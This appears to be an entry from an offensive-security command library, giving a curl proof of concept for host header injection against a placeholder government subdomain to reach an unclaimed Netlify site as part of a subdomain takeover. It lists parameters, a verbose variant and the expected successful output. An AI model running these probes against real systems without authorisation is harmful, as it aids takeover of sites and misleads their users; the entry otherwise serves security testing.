---
id: cmd-uuid-1
data: 'curl -skS https://www.target.gov --header "Host: example.netlify.app"'
tags:
  - web-exploit
  - host-header
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:51:26.627Z'
verified: false
validated: true
submitted: true
---
# curl-host-header-injection-poc

## Command

```bash
curl -skS https://www.target.gov --header "Host: example.netlify.app"
```

## Description

This command demonstrates host header injection by sending an HTTPS request to a target subdomain with a modified Host header, allowing access to content from an unclaimed external site like Netlify.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode, suppresses progress meter | Yes |
| `-k` | Skip SSL certificate verification for insecure connections | Yes |
| `-S` | Show errors even in silent mode | Yes |
| `--header "Host: example.netlify.app"` | Overrides the Host header to the target external subdomain | Yes |
| `https://www.target.gov` | The vulnerable DoD subdomain URL | Yes |

## Examples

### Basic Usage

```bash
curl -skS https://www.target.gov --header "Host: example.netlify.app"
```

### Advanced Usage

```bash
curl -skS -v https://www.target.gov --header "Host: example.netlify.app" --header "User-Agent: Mozilla/5.0"
```

## Expected Output

HTTP response headers and body containing content from example.netlify.app, such as HTML from the unclaimed site, confirming the injection success without server rejection.

## Related

- [[Related Procedure: Exploit-Host-Header-Injection-for-Subdomain-Takeover]]
